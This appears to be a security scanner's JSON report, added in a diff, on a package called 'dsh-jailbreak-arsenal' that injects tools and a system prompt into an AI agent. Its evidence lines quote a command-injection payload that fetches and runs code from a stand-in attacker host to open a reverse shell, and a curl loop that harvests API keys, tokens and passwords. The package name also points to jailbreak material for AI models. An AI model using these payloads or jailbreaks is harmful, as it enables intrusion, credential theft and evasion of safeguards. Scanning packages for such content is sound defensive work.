@@ -1,0 +1,114 @@
+{
+  "name": "dsh-jailbreak-arsenal",
+  "version": "1.7.0",
+  "scannedAt": "2026-11-05T08:17:14.943Z",
+  "icon": null,
+  "network": {
+    "hit": true,
+    "evidence": [
+      {
+        "file": "bundled_skills.json",
+        "line": 4,
+        "text": "cat js_urls.txt | while read url; do\\n  curl -s \\\"$url\\\" | grep -oP '(api[_-]?key|secret|token|password)\\\\s*[:=]\\\\s*[\\\"\\\\047][^\\\"\\\\047]+'\\ndone\\n```\\n\\n**高价值目标*"
+      },
+      {
+        "file": "bundled_skills.json",
+        "line": 9,
+        "text": "t install trivy` |\\n| Syft | SBOM 生成 | `curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh` |\\n| cdxgen | CycloneDX SBOM 生成 | `npm instal"
+      },
+      {
+        "file": "bundled_skills.json",
+        "line": 39,
+        "text": " system\\n\\nStep 9 利用\\n  - 构造 hostname=`;wget http://attacker/x;sh x;`\\n  - 仿真态成功反弹 shell\\n  - 真机复测通过 → 提报 SRC\\n```\\n\\n### 场景 2：加密固件（找 bootloader 解密例程）\\n\\n```tex"
+      },
+      {
+        "file": "index.js",
+        "line": 579,
+        "text": "tool> --help 当参考得出'78% 参数不存在'是错的: macOS curl --help 不列全、docker --help 不含子命令参数、把脚本自己的参数算到解释器头上(python3 x.py --target)、把远端程序参数算到 ssh 头上。修正后(用 --help all + man、只算工"
+      }
+    ]
+  },
+  "fileSystem": {
+    "hit": true,
+    "evidence": [
+      {
+        "file": "index.js",
+        "line": 1,
+        "text": "import { readFileSync } from \"node:fs\";"
+      },
+      {
+        "file": "index.js",
+        "line": 5,
+        "text": "const PKG = JSON.parse(readFileSync(new URL(\"./package.json\", import.meta.url), \"utf8\"));"
+      },
+      {
+        "file": "index.js",
+        "line": 9,
+        "text": "const ROLEPLAY_TEXT = readFileSync(ROLEPLAY_URL, \"utf8\");"
+      },
+      {
+        "file": "index.js",
+        "line": 12,
+        "text": "const K3_TEXT = readFileSync(K3_URL, \"utf8\");"
+      },
+      {
+        "file": "index.js",
+        "line": 15,
+        "text": "const TEXTBOOK_TEXT = readFileSync(TEXTBOOK_URL, \"utf8\");"
+      }
+    ]
+  },
+  "agentTools": {
+    "hit": true,
+    "evidence": [
+      {
+        "file": "index.js",
+        "line": 753,
+        "text": "export const inject = [\"tools\", \"systemPrompt\"];"
+      },
+      {
+        "file": "index.js",
+        "line": 770,
+        "text": "ctx.tools.register(transformTool);"
+      },
+      {
+        "file": "index.js",
+        "line": 771,
+        "text": "ctx.tools.register(profileTool);"
+      },
+      {
+        "file": "index.js",
+        "line": 772,
+        "text": "ctx.tools.register(skillTool);"
+      },
+      {
+        "file": "index.js",
+        "line": 773,
+        "text": "ctx.tools.register(pickTool);"
+      }
+    ]
+  },
+  "childProcess": {
+    "hit": false,
+    "evidence": []
+  },
+  "installScripts": {
+    "hit": false,
+    "evidence": []
+  },
+  "dependencies": 0,
+  "minifiedFiles": [],
+  "binaryFiles": [],
+  "requiredServices": [
+    "systemPrompt",
+    "tools"
+  ],
+  "setupHints": [
+    {
+      "file": "README.md",
+      "line": 118,
+      "text": "pip install openai httpx python-dotenv matplotlib"
+    }
+  ],
+  "skippedEntries": []
+}
